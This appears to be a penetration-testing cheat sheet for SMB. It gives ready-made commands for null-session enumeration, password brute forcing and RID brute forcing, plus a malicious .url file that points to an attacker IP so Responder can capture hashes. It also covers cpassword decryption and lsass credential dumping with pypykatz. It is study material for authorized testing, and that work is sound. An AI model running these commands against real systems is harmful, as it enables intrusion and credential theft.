# Server Message Block

## Footprinting The Service

### Nmap

{% code overflow="wrap" %}
```
sudo nmap 10.129.14.128 -sV -sC -p139,445
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (17) (1) (1).png" alt=""><figcaption></figcaption></figure>

### RPCclient

{% code overflow="wrap" %}
```
rpcclient -U "" 10.129.14.128
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (18) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
rpcclient -U'%' 10.10.110.17
```

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption><p><code>-U'%'</code>: Explicitly sends an empty username and no password. <code>-N</code>: Does not send any username or password, attempting to establish a null session.</p></figcaption></figure>

| Query                     | Description                                                        |
| ------------------------- | ------------------------------------------------------------------ |
| `srvinfo`                 | Server information.                                                |
| `enumdomains`             | Enumerate all domains that are deployed in the network.            |
| `querydominfo`            | Provides domain, server, and user information of deployed domains. |
| `netshareenumall`         | Enumerates all available shares.                                   |
| `netsharegetinfo <share>` | Provides information about a specific share.                       |
| `enumdomusers`            | Enumerates all domain users.                                       |
| `queryuser <RID>`         | Provides information about a specific user.                        |

## Search For Known SMB Version Vulnerabilities

## Check For Shares Using Null Sessions

```
smbclient -N -L //$ip/
```

```
cme smb $ip --shares -u "guest" -p ""
```

## Brute Forcing

```
cme smb $ip -u users.list -p pws.list --local-auth | grep '[+]'
```

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption><p>If the target</p></figcaption></figure>

## URL File attacks

_Test for URL File attacks by creating a file called "@somename.url" with the following contents, upload, spin up smbserver to capture hash_

```
[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\EnterAttackerip\%USERNAME%.icon
IconIndex=1
```

_Run Responder to capture hashes_

```
/opt/Responder-3.1.3.0/Responder.py -I tun0
```

## Read / Upload access

_Attempt to download and view share contents using valid credential / anonymous login / null session_

```
smbmap -H $ip
```

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

```
smbmap -H $ip -r 
```

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption><p>Using <code>smbmap</code> with the <code>-r</code> or <code>-R</code> (recursive) option, one can browse the directories</p></figcaption></figure>

```
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption><p>Downloading</p></figcaption></figure>

```
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption><p>Uploading</p></figcaption></figure>

```
smbmap -u guest -p "" -H $ip -A '.*' -R
```

## Cpassword discovery

_Search "Groups.xml" for cpassword decryption_

```
gpp-decrypt cpassword
```

## lsass.zip lsass.dmp

_search lsass.zip or lsass.dmp to use to dump credentials / keys / tickets_

```
pypykatz lsa minidump "lsass.zip"
```

## Alternate Data Streams (ADS)

_test for alternate data streams after discovering 0 byte files_

```
allinfo filename
```

## Check Password Policy

```
cme smb $ip --pass-pol -u guest -p ""
```

## User Discovery

_Check For users using valid credential / anonymous login / null session_

```
cme smb $ip --users -u guest -p ""
```

```
cme smb $ip --rid-brute -u guest -p ""
```

## Group discovery

_check for groups using valid credential / anonymous login / null session_

```
cme smb $ip --groups -u guest -p ""
```

## Smbclient

_Interactively access the smb shares using smbclient_

```
smbclient //$ip/someshare -N
```

```
smbclient //$ip/someshare -U 'guest' -N
```

```
smbclient //$ip/someshare -U 'validuser' -p 'validpass'
```

## Smbmap

```
// Some code
```

## Dangerous Settings

| Setting                     | Description                                                         |
| --------------------------- | ------------------------------------------------------------------- |
| `browseable = yes`          | Allow listing available shares in the current share?                |
| `read only = no`            | Forbid the creation and modification of files?                      |
| `writable = yes`            | Allow users to create and modify files?                             |
| `guest ok = yes`            | Allow connecting to the service without using a password?           |
| `enable privileges = yes`   | Honor privileges assigned to specific SID?                          |
| `create mask = 0777`        | What permissions must be assigned to the newly created files?       |
| `directory mask = 0777`     | What permissions must be assigned to the newly created directories? |
| `logon script = script.sh`  | What script needs to be executed on the user's login?               |
| `magic script = script.sh`  | Which script should be executed when the script gets closed?        |
| `magic output = script.out` | Where the output of the magic script needs to be stored?            |
